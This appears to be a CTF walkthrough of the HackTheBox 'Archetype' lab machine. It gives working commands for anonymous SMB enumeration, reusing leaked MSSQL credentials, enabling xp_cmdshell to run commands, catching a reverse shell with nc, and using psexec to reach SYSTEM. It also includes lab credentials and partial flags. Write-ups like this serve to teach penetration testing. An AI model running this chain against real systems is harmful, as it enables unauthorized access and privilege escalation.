---
title: "HackTheBox: Archetype Walkthrough"
date: 2025-04-19
description: "SMB misconfiguration → MSSQL xp_cmdshell → psexec → SYSTEM. Windows foothold via anonymous share access."
tags: ["ctf", "hackthebox", "windows", "smb", "mssql", "offensive"]
---

## Target

Archetype — HTB Starting Point, Windows machine.

IP: `10.10.10.27`

## Enumeration

```bash
nmap -sV -sC -p- 10.10.10.27
```

Interesting ports:
- `445/tcp` — SMB
- `1433/tcp` — MSSQL

```bash
smbclient -N -L //10.10.10.27
```

Anonymous access → `backups` share → `prod.dtsConfig` file.

## Credential Extraction

`prod.dtsConfig` contains plaintext MSSQL credentials:

```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp321;User ID=ARCHETYPE\sql_svc;...</ConfiguredValue>
```

## MSSQL to Shell

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp321@10.10.10.27 -windows-auth
```

Enable `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- archetype\sql_svc
```

Upload reverse shell payload via `xp_cmdshell` + SMB share, catch with nc.

## Privilege Escalation

PowerShell history at `C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`:

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

Administrator plaintext creds. `psexec.py`:

```bash
python3 psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
# C:\Windows\system32> whoami
# nt authority\system
```

## Flags

- User: `3e7b102e78218c841ab66da...` (sql_svc desktop)
- Root: `b91ccec3305e98240082d4da...` (Administrator desktop)

## Lessons

1. Anonymous SMB shares are always worth enumerating — config files leak creds
2. Check PowerShell history before running any privesc tools
3. `xp_cmdshell` is disabled by default but easily re-enabled with SA or sysadmin role
